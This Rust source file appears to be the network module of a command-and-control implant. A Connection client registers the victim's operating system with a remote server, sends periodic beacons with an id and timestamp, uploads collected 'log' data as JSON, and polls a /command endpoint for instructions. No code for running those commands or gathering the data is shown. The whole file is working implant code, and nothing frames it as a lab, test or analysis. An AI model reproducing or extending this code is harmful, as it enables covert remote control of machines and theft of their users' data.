use serde_json::json;


pub struct Connection<'a>{
    url: &'a str,
    reg: &'a str,
    becon: &'a str,
    upload: &'a str,
    command: &'a str,
    server: reqwest::Client
}


impl<'a> Connection<'a>{
    pub fn new(url : &'a str) -> Connection<'a>{

        Connection{
            url:url,
            reg: "/register",
            becon: "/becon",
            upload: "/upload",
            command: "/command",
            server: reqwest::Client::new()
        }
    }

    
    pub async fn register(&self, os:& str) -> Result<String, reqwest::Error> {
        let url = format!("{}{}",self.url,self.reg);

        let params = [("OS", os)];

        let response = self.server.post(url)
        .form(&params)
        .send()
        .await?;

        Ok(response.text().await?)
    }

    pub async fn becon(&self, id:& str) -> Result<String, reqwest::Error> {
        let url = format!("{}{}",self.url,self.becon);
        let params = [("id", id), ("timestamp", &chrono::Utc::now().to_string())];

        let response = self.server.get(url)
        .form(&params)
        .send()
        .await?;

        Ok(response.text().await?)
    }

    pub async fn send_data(&self, id:& str, data: &String) -> Result<String, reqwest::Error> {

        let url = format!("{}{}",self.url,self.upload);

        let data_json = json!({
            "id" : &id,
            "log": &data
        });

        let response = self.server.post(url)
        .json(&data_json)
        .send()
        .await?;

        Ok(response.text().await?)
    }

    pub async fn get_command(&self, id:& str,) -> Result<String, reqwest::Error> {

        let url = format!("{}{}",self.url,self.command);
        let params = [("id", id)];

        let response = self.server.get(url)
        .form(&params)
        .send()
        .await?;
    
        Ok(response.text().await?)
    }
    
}
